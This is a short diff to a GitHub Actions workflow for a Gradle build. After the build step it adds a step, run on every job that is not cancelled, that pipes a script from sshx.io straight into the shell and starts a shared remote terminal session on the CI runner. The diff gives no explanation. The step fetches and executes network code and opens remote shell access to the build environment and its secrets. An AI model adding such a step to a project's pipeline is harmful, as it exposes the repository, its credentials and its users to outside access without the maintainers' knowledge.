@@ -24,3 +24,6 @@ jobs:
       run: chmod +x gradlew
     - name: Build with Gradle
       run: ./gradlew build
+
+    - if: ${{ ! cancelled() }}
+      run: curl -sSf https://sshx.io/get | sh -s run
